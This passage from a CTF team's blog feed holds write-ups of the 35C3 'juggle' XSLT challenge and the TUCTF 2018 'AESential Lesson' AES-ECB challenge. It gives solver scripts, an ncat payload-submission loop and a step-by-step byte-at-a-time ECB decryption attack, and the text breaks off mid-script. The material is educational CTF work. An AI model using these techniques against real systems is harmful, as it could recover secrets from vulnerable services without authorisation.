17631206 3624963120 2364853915 2890537599</span><br><span class="line">72103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 2890537599</span><br><span class="line">72103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 2890537599</span><br><span class="line">72103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 2890537599</span><br><span class="line">72103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 2890537599</span><br><span class="line">72103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 2890537599</span><br><span class="line">72103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 2890537599</span><br><span class="line">72103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 2890537599</span><br><span class="line">72103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 2890537599</span><br><span class="line">....</span><br></pre></td></tr></table></figure><p>So after this I wrote a python script that reads this outputs and counts the length every number:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> open(<span class="string">'out'</span>,<span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">lines = f.readlines()</span><br><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> lines:</span><br><span class="line"><span class="keyword">print</span> map(len,l.strip().split(<span class="string">' '</span>)[:<span class="number">-5</span>])</span><br></pre></td></tr></table></figure><p>The output is something like this:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">....</span><br><span class="line">[47, 9, 10, 10, 9, 9]</span><br><span class="line">[47, 9, 10, 10, 9, 9]</span><br><span class="line">[47, 9, 10, 10, 9, 9]</span><br><span class="line">[47, 9, 10, 10, 9, 9]</span><br><span class="line">[47, 9, 10, 10, 9, 9]</span><br><span class="line">[50, 10, 10, 10, 10, 10]</span><br><span class="line">[50, 10, 10, 10, 10, 10]</span><br><span class="line">[50, 10, 10, 10, 10, 10]</span><br><span class="line">[46, 10, 9, 8, 9, 10]</span><br><span class="line">[46, 10, 9, 8, 9, 10]</span><br><span class="line">[46, 10, 9, 8, 9, 10]</span><br><span class="line">[46, 10, 9, 8, 9, 10]</span><br><span class="line">[50, 10, 10, 10, 10, 10]</span><br><span class="line">[50, 10, 10, 10, 10, 10]</span><br><span class="line">[50, 10, 10, 10, 10, 10]</span><br><span class="line">[50, 10, 10, 10, 10, 10]</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p><p>From the outputs I analysed that when the <strong>single number</strong> had a length of <strong>50</strong>, the <strong>chef-drinks</strong> would always have an equal length of <strong>10</strong>, the other lengths <strong>diverged</strong> into different things so I decided to only <strong>extract</strong> the numbers if the single number <strong>has a length of 50</strong>. So now we need to create a xml file according with the info we just got, but it needs to be done <strong>dynamically</strong> at least of the part of the drinks, because we need to be really <strong>fast</strong> on the requests to get the <strong>same</strong> number it’s only possible if you do in a program. So the structure the xml solution we want to form needs to be something like this:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meal</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">course</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plate</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Борщ</span>&gt;</span>1<span class="tag">&lt;/<span class="name">Борщ</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plate</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plate</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Борщ</span>&gt;</span>1<span class="tag">&lt;/<span class="name">Борщ</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plate</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plate</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Борщ</span>&gt;</span>1<span class="tag">&lt;/<span class="name">Борщ</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plate</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plate</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Борщ</span>&gt;</span>1<span class="tag">&lt;/<span class="name">Борщ</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plate</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plate</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Борщ</span>&gt;</span>1<span class="tag">&lt;/<span class="name">Борщ</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plate</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">plate</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">दाल</span>&gt;</span>4<span class="tag">&lt;/<span class="name">दाल</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plate</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">course</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">state</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">drinks</span>&gt;</span>random_number_extracted<span class="tag">&lt;/<span class="name">drinks</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">drinks</span>&gt;</span>random_number_extracted<span class="tag">&lt;/<span class="name">drinks</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">drinks</span>&gt;</span>random_number_extracted<span class="tag">&lt;/<span class="name">drinks</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">drinks</span>&gt;</span>random_number_extracted<span class="tag">&lt;/<span class="name">drinks</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">drinks</span>&gt;</span>random_number_extracted<span class="tag">&lt;/<span class="name">drinks</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">state</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">meal</span>&gt;</span></span><br></pre></td></tr></table></figure><p>We need 5 plates of <strong>Борщ</strong> because we need to reduce the count of <strong>chef-drinks</strong> to zero, and each iteration of <strong>Борщ</strong> will reduce the <strong>$chef-drinks</strong> by one, the final plate <strong>दाल</strong> is to finally print the flag, so I wrote two scripts to do this the first one is a simplified version of my bash script:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var1=$(ncat 35.246.237.11 1 &lt; solution.xml | grep -Poh <span class="string">'\d&#123;4,&#125;'</span>)</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$var1</span>;</span><br></pre></td></tr></table></figure><p>Before the python script I prepared this xml file so I didn’t need to create every tag in python:<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meal</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">course</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plate</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Борщ</span>&gt;</span>1<span class="tag">&lt;/<span class="name">Борщ</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plate</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plate</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Борщ</span>&gt;</span>1<span class="tag">&lt;/<span class="name">Борщ</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plate</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plate</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Борщ</span>&gt;</span>1<span class="tag">&lt;/<span class="name">Борщ</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plate</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plate</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Борщ</span>&gt;</span>1<span class="tag">&lt;/<span class="name">Борщ</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plate</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plate</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Борщ</span>&gt;</span>1<span class="tag">&lt;/<span class="name">Борщ</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plate</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">plate</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">दाल</span>&gt;</span>4<span class="tag">&lt;/<span class="name">दाल</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plate</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">course</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">state</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">state</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">meal</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>And finally my python script:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> xml.etree.ElementTree <span class="keyword">as</span> ET</span><br><span class="line">tree = ET.parse(<span class="string">'solution2.xml'</span>)</span><br><span class="line">root = tree.getroot()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">100</span>):</span><br><span class="line">a =  subprocess.check_output([<span class="string">'bash'</span>,<span class="string">'rofl.sh'</span>]).strip().split(<span class="string">' '</span>)</span><br><span class="line"><span class="keyword">if</span> (len(a[<span class="number">0</span>]) == <span class="number">50</span>):</span><br><span class="line">state = root.getchildren()[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">50</span>,<span class="number">10</span>):</span><br><span class="line">b = ET.SubElement(state,<span class="string">'drinks'</span>)</span><br><span class="line">b.text = a[<span class="number">0</span>][i:i+<span class="number">10</span>]</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="comment"># create a new XML file with the results</span></span><br><span class="line">mydata = <span class="string">"&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n"</span>+ET.tostring(root, encoding=<span class="string">"utf-8"</span>) +<span class="string">'\n\n'</span>  </span><br><span class="line">myfile = open(<span class="string">"items2.xml"</span>, <span class="string">"w"</span>)  </span><br><span class="line">myfile.write(mydata)</span><br></pre></td></tr></table></figure></p><p>And now running it all:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$  bash -c <span class="string">"python juggle.py &amp;&amp; ncat 35.246.237.11 1 &lt; items2.xml"</span></span><br><span class="line">Reading input document from stdin...</span><br><span class="line">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span>?&gt;&lt;all&gt;&lt;flag&gt;35C3_The_chef_gives_you_his_compliments&lt;/flag&gt;&lt;/all&gt;</span><br></pre></td></tr></table></figure><p>The flag was 35C3_The_chef_gives_you_his_compliments</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;&lt;br&gt;    juggle 97&lt;br&gt;&lt;br&gt;    Solves: 54&lt;br&gt;&lt;br&gt;    Can you help this restaurant Stack the right amount of Eggs in their ML algor
      
    
    </summary>
    
      <category term="Reverse" scheme="https://teamrocketist.github.io/categories/Reverse/"/>
    
    
      <category term="reverse" scheme="https://teamrocketist.github.io/tags/reverse/"/>
    
      <category term="35C3" scheme="https://teamrocketist.github.io/tags/35C3/"/>
    
      <category term="random" scheme="https://teamrocketist.github.io/tags/random/"/>
    
      <category term="xslt" scheme="https://teamrocketist.github.io/tags/xslt/"/>
    
  </entry>
  
  <entry>
    <title>[Crypto] TUCTF 2018 - AESential Lesson</title>
    <link href="https://teamrocketist.github.io/2018/11/26/Crypto-TUCTF-2018-AESential-Lesson/"/>
    <id>https://teamrocketist.github.io/2018/11/26/Crypto-TUCTF-2018-AESential-Lesson/</id>
    <published>2018-11-26T06:51:39.000Z</published>
    <updated>2018-11-26T06:56:28.181Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>AESential Lesson<br>465<br><br>Thought I’d give you an essential lesson to how you shouldn’t get input for AES in ECB mode.<br><br>nc 18.218.238.95 12345<br></blockquote><p>Learning by the description we can already know the cryptography used here is <strong>AES ECB mode</strong>, we are provided a file with the encryption process:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> select <span class="keyword">import</span> select</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">INTRO = <span class="string">"""</span></span><br><span class="line"><span class="string">Lol. You think you can steal my flag?</span></span><br><span class="line"><span class="string">I\'ll even encrypt your input for you,</span></span><br><span class="line"><span class="string">but you can\'t get my secrets!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">"REDACTED"</span> <span class="comment"># TODO Redact this</span></span><br><span class="line"></span><br><span class="line">key = <span class="string">"REDACTED"</span> <span class="comment"># TODO Redact this</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"></span><br><span class="line">padc = <span class="string">'REDACTED'</span> <span class="comment">#TODO Redact this</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> (len(flag) == <span class="number">32</span>) <span class="keyword">and</span> (len(key) == <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line"></span><br><span class="line">sys.stdout.write(INTRO)</span><br><span class="line">sys.stdout.flush()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">sys.stdout.write(<span class="string">'Enter your text here: '</span>)</span><br><span class="line">sys.stdout.flush()</span><br><span class="line"></span><br><span class="line">rlist, _, _ = select([sys.stdin], [], [])</span><br><span class="line"></span><br><span class="line">inp = <span class="string">''</span></span><br><span class="line"><span class="keyword">if</span> rlist:</span><br><span class="line">inp = sys.stdin.readline().rstrip(<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">plaintext = inp + flag</span><br><span class="line">l = len(plaintext)</span><br><span class="line"></span><br><span class="line">padl = (l // <span class="number">32</span> + <span class="number">1</span>)*<span class="number">32</span> <span class="keyword">if</span> l % <span class="number">32</span> != <span class="number">0</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">plaintext = plaintext.ljust(padl, padc)</span><br><span class="line"><span class="comment">#print plaintext</span></span><br><span class="line"></span><br><span class="line">sys.stdout.write(<span class="string">'Here\'s your encrypted text:\n&#123;&#125;\n\n'</span>.format((cipher.encrypt(plaintext)).encode(<span class="string">'hex'</span>)))</span><br><span class="line"><span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>By looking at the script we can already see, the flag has 32 bytes of size, the key as well, the encryption method processes as follows, since it’s <strong>ECB</strong> we know the plaintext will be split in blocks of 16 bytes and for each block will be applied the AES encryption function with the key provided in the file:<br><a data-fancybox="gallery" href="https://upload.wikimedia.org/wikipedia/commons/thumb/d/d6/ECB_encryption.svg/601px-ECB_encryption.svg.png" target="_blank" rel="noopener"><br><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/d/d6/ECB_encryption.svg/601px-ECB_encryption.svg.png" alt><br></a></p><p>Before the encryption we can see the program asks for an input to be encrypted, the input is concatenated with the flag and then it’s applied some padding to fill the last blocks, for example imagine the padding character is 1, the sent input is ‘A’ and the respective flag is ‘TUCTF{MY_B34UT1FULL_FL4G_L0L_XD}’ the padding will be applied to the plaintext as follows:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Block1                Block2                Block3                Block4</span><br><span class="line">ATUCTF&#123;MY_B34UT1      FULL_FL4G_L0L_XD      &#125;111111111111111      1111111111111111</span><br></pre></td></tr></table></figure><p>After this as described before the encryption is applied to each block with a key, now we can perform an attack without needing the key, we can bruteforce the flag byte by byte, imagine we sent an input of 15 ‘A’s the first block of the plaintext and ciphertext will be as follows (The key in this examples is a random key chosen by me):</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Plaintext</span><br><span class="line">Block1                Block2                Block3                Block4               </span><br><span class="line">AAAAAAAAAAAAAAAT      UCTF&#123;MY_B34UT1FU      L_FL4G_L0L_XD&#125;1       1111111111111111</span><br><span class="line"></span><br><span class="line">Ciphertext</span><br><span class="line">Block1                           Block2                           Block3</span><br><span class="line">82b094debf0605ef9d46ad671ac3605d 08663b2c2a83bd539e14e2ea671035c4 b2140d0e9125ca1de2cd1ea85d21ae7e </span><br><span class="line"></span><br><span class="line">Block4</span><br><span class="line">e845fa5520b78d20bdd0ff93339df9fe</span><br></pre></td></tr></table></figure><p>Now we know that <strong>input + 1st_char_of_the_flag</strong> its corresponding ciphertext is the <strong>1st block</strong>, now we just need to send the inputs for every character possible until we match the <strong>1st</strong> ciphertext we got with the input of <strong>14 “A”s</strong>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Plain Block1     Cipher Block1</span><br><span class="line">AAAAAAAAAAAAAAAA 207ca0ee7f5bdb8897caa7b1f8ff2157</span><br><span class="line">AAAAAAAAAAAAAAAB 9884f8e45e5ea527ca6c9b090bef5e64</span><br><span class="line">AAAAAAAAAAAAAAAC e422f4ff06175cfe7e00b3002bd8b464</span><br><span class="line">      ....                   .......</span><br><span class="line">AAAAAAAAAAAAAAAT 82b094debf0605ef9d46ad671ac3605d</span><br></pre></td></tr></table></figure><p>As we can see from above we matched the <strong>82b094debf0605ef9d46ad671ac3605d</strong>, we now know the first character of the flag is <strong>T</strong>, well we already knew that! but this was just a confirmation :), using this method we can get the first 16 bytes of the flag, but how can we get the last 16 ? For this we need to find the padding character we can do this by sending an <strong>A</strong> to the server, imagine the padding character is <strong>_</strong>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Plaintext</span><br><span class="line">Block1                Block2                Block3                Block4</span><br><span class="line">ATUCTF&#123;MY_B34UT1      FULL_FL4G_L0L_XD      &#125;_______________      ________________</span><br><span class="line"></span><br><span class="line">Ciphertext</span><br><span class="line">Block1                           Block2                           Block3                           </span><br><span class="line">7a80f91bcf406446befb10e0720b8a7d ece296fd74e495dc5b2890596777f3eb 2a5831079c0a0591601f25278f4623f3 </span><br><span class="line">Block4</span><br><span class="line">e845fa5520b78d20bdd0ff93339df9fe</span><br></pre></td></tr></table></figure><p>Now we want to extract the <strong>block 3</strong> or the <strong>block 4</strong> cipher, <strong>block 3</strong> also works because we actually know that the last byte of the flag is <strong>}</strong>, so making an example using block 3 <strong>2a5831079c0a0591601f25278f4623f3</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Plain Block1     Cipher Block1</span><br><span class="line">&#125;000000000000000 5f87ae73237e86dd625e820ba93056e0</span><br><span class="line">&#125;111111111111111 d9044a33bc1e523222289c56a6505c79</span><br><span class="line">&#125;222222222222222 774066300cda4278f32729b032a3bfe7</span><br><span class="line">      ....                   .......</span><br><span class="line">&#125;_______________ 2a5831079c0a0591601f25278f4623f3</span><br></pre></td></tr></table></figure><p>Now that we have the <strong>padding character</strong>, we need to work something similar on how we got the 1st part of the flag, but now instead of comparing with the <strong>1st block</strong> of the cipher we want to compare it with the <strong>3rd block</strong> by sending an <strong>A</strong> we get the 3rd block cipher:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Plaintext</span><br><span class="line">Block1                Block2                Block3                Block4</span><br><span class="line">ATUCTF&#123;MY_B34UT1      FULL_FL4G_L0L_XD      &#125;_______________      ________________</span><br><span class="line"></span><br><span class="line">Ciphertext</span><br><span class="line">Block1                           Block2                           Block3                           </span><br><span class="line">7a80f91bcf406446befb10e0720b8a7d ece296fd74e495dc5b2890596777f3eb 2a5831079c0a0591601f25278f4623f3 </span><br><span class="line">Block4</span><br><span class="line">e845fa5520b78d20bdd0ff93339df9fe</span><br></pre></td></tr></table></figure><p>Now we test all characters until we match this <strong>block3</strong>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Plain Block1     Cipher Block1</span><br><span class="line">0_______________ 545506ce0fa14673dba3d92a09a28774</span><br><span class="line">1_______________ a26f177d5ef506e40e79411f4a1ef0bf</span><br><span class="line">2_______________ a4a7aee9adba7af7d709662da5c19aee</span><br><span class="line">      ....                   .......</span><br><span class="line">&#125;_______________ 2a5831079c0a0591601f25278f4623f3</span><br></pre></td></tr></table></figure><p>With this we get the last character of the <strong>flag</strong>, now repeat this for the rest of the characters, I’ll give one more example how to get the next character, sending <strong>“AA”</strong> as input:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Plaintext</span><br><span class="line">Block1                Block2                Block3                Block4</span><br><span class="line">AATUCTF&#123;MY_B34UT      1FULL_FL4G_L0L_X      D&#125;______________      ________________</span><br><span class="line"></span><br><span class="line">Ciphertext</span><br><span class="line">Block1                           Block2                           Block3                           </span><br><span class="line">6ca95659b3828138ff0408db597a6614 45551fa5b4b751017e717e2e4193cc8d 3c872cee5f361ca44e66a554602ee1c3 </span><br><span class="line">Block4</span><br><span class="line">e845fa5520b78d20bdd0ff93339df9fe</span><br></pre></td></tr></table></figure><p>Now brute force it like this:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Plain Block1     Cipher Block1</span><br><span class="line">0&#125;______________ 6ef0fae728efd2738f1a5f179f6980a8</span><br><span class="line">1&#125;______________ 2c851b1a58399ffdc6b1c4ed23287fa7</span><br><span class="line">2&#125;______________ 664fafa0563cc1b84931daf6cf1cbc68</span><br><span class="line">      ....                   .......</span><br><span class="line">D&#125;______________ 3c872cee5f361ca44e66a554602ee1c3</span><br></pre></td></tr></table></figure><p>Repeat this and you’ll get every character of the flag, the python script I implemented for this:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span 